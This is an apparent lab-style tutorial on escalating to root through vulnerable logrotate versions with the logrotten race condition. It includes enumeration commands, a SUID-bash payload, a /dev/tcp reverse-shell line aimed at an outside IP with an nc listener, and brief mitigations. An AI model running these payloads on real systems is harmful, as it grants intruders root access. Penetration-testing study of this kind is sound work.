## Overview

**logrotate** is a Linux utility used to manage log files so they do not grow indefinitely and consume all available disk space. It is commonly run automatically via **cron** and handles tasks such as:

- rotating old logs
- compressing archived logs
- creating fresh log files
- deleting very old logs

Because logrotate is often executed by **root**, misconfigurations or vulnerable versions can sometimes be abused for **privilege escalation**.

---

# How Logrotate Works

Logrotate usually uses:

- the global config file: `/etc/logrotate.conf`
- per-application configs in: `/etc/logrotate.d/`

Typical functions include:

- rotate logs based on **time**
- rotate logs based on **size**
- compress archived logs
- create fresh empty logs after rotation
- remove old archives after a certain count

## Example global config

```bash
cat /etc/logrotate.conf
```

Example output:

```conf
# rotate log files weekly
weekly

# use the adm group by default
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new empty log files after rotating old ones
create

# packages drop log rotation information into this directory
include /etc/logrotate.d
```

Important options to note:

- `create` → create a new log file after rotation
- `compress` → compress rotated logs
- `su root adm` → rotation runs with elevated privileges
- `include /etc/logrotate.d` → additional application configs exist

---

# Why Logrotate Matters for Privilege Escalation

If logrotate is:

- running as **root**
- managing a log file we can **write to**
- and the installed version is **vulnerable**

then a race condition may allow us to execute a payload as root.

This is commonly associated with the **logrotten** technique.

---

# Conditions Required

To exploit logrotate in this way, we generally need:

- **write permission** to the target log file
- logrotate must run as **root** or another privileged user
- a **vulnerable version** of logrotate

Common vulnerable versions mentioned in public writeups include:

- `3.8.6`
- `3.11.0`
- `3.15.0`
- `3.18.0`

# Initial Enumeration

## Check help/version

```bash
logrotate --help
logrotate --version
```

## Inspect global configuration

```bash
cat /etc/logrotate.conf
```

## Check current logrotate state

```bash
cat /var/lib/logrotate.status
```

Example:

```text
/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

This helps show which logs are being tracked and when they were last rotated.

## Inspect per-service configs

```bash
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg
```

Example config:

```conf
/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

# Key Things to Check

Before attempting anything, verify:

- Which log file is writable?
- Which config controls it?
- Does rotation use `create` or `compress`?
- Is logrotate run by cron?
- How often does rotation happen?
- Is the installed version vulnerable?

## Check writable logs

```bash
find / -type f -writable 2>/dev/null | grep -E "log|logs"
```

## Check whether logrotate uses `create` or `compress`

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

Example result:

```text
create
```

That matters because some exploitation approaches are tied to the way logrotate recreates files.

# Better Method – logrotten Race Condition

A common approach is to use **logrotten**, which abuses a race condition in vulnerable logrotate versions.

## 1. Compile logrotten

```bash
gcc logrotten.c -o logrotten
```

## 2. Create a SUID payload

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > payloadfile
```

This payload:

- copies `/bin/bash` to `/tmp/bash`
- sets the SUID bit
- allows us to run it later as root

## 3. Trigger a rotation condition

```bash
cd ~/backups
cp access.log.1 access.log
```

## 4. Run the exploit in the background

```bash
cd ~
./logrotten -p ./payloadfile /home/htb-student/backups/access.log &
```

## 5. Trigger rotation again

```bash
cd ~/backups
cp access.log.1 access.log
```

## 6. Wait for the exploit to complete, then escalate

Once you see a success message such as `Done!`, run:

```bash
/tmp/bash -p
```

## 7. Verify privileges

```bash
whoami
id
```

Expected result:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

# Alternative Payload – Reverse Shell

Instead of creating a SUID bash, a reverse shell payload can also be used.

Example payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Start a listener:

```bash
nc -nlvp 9001
```

Run the exploit:

```bash
./logrotten -p ./payload /tmp/tmp.log
```

If successful, the listener receives a root shell.

---

# What to Look For During Enumeration

## 1. Writable log files

If we can write to a log file that is later rotated by root, it becomes interesting.

## 2. Root-owned logrotate execution

Check cron/system timers and ownership.

## 3. Rotation style

The `create` option is especially useful in many public exploit workflows.

## 4. Timing

If rotation happens frequently, the exploit becomes easier to trigger and observe.

## 5. Writable directories around the log path

These may help with staging files or manipulating the environment.

---

# Typical Attack Flow

1. Identify a **writable log file**
2. Confirm it is handled by **logrotate**
3. Confirm logrotate runs as **root**
4. Confirm the **installed version is vulnerable**
5. Determine whether the configuration uses **create** or **compress**
6. Compile and stage **logrotten**
7. Prepare a payload
8. Trigger the race condition
9. Escalate via:
   - SUID bash
   - reverse shell
   - other root-level payload

---

# Defensive Notes

This issue can be mitigated by:

- upgrading logrotate to a patched version
- restricting write permissions on log files
- avoiding dangerous ownership/permission combinations
- reducing unnecessary root-run rotation logic
- reviewing cron-driven log handling processes

# Key Takeaways

- logrotate is normally benign, but dangerous when paired with:
  - writable logs
  - root execution
  - vulnerable versions
- the **logrotten** race-condition method is one of the best-known exploitation paths
- using a **SUID bash payload** is often cleaner than a reverse shell

  - writable logs
  - `/etc/logrotate.conf`
  - `/etc/logrotate.d/*`
  - cron/system timers
  - logrotate version
